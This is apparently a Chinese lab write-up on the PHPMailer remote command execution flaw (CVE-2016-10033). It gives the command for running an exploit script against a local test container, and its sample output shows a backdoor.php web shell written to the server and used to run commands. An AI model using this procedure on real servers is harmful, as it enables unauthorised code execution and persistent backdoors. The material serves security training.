# PHPMailer < 5.2.18 远程命令执行漏洞

## 【实验原理】

这个致命的漏洞是由class.phpmailer.php没有正确处理用户的请求导致的。结果远程攻击者能够在有弱点的服务器上远程执行代码。

## 【实验目的】

提高学员的综合实战能力。以及对提升学员对phpmailer邮件系统的理解。

## 【实验环境】

Ubuntu 64位操作系统。

## 【实验工具】

浏览器

## 【实验步骤】

### Exp

**Exp 使用方法：**

`$ ./exp.sh host:port`

假设容器启动后访问的地址为：http://127.0.0.1:8000/

`$ ./exp.sh 127.0.0.1:8000`

执行完后耐心等待一会（比较慢，大概2分钟以内），就会向服务器中写入 `backdoor.php `文件(写入的物理路径见`exp.sh`,默认写入到`/var/www/html/`目录下)，然后就看到如下输出：

```shell
➜ ./exp.sh 127.0.0.1:8000
[+] CVE-2016-10033 exploit by opsxcq
[+] Exploiting 127.0.0.1:8000
[+] Target exploited, acessing shell at http://127.0.0.1:8000/backdoor.php
[+] Checking if the backdoor was created on target system
[+] Backdoor.php found on remote system
[+] Running whoami
www-data
RemoteShell> id
[+] Running id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


## 【实验总结】

本次实验主要是模拟真实环境中对phpmailer邮件系统的理解以及利用提取有效信息。
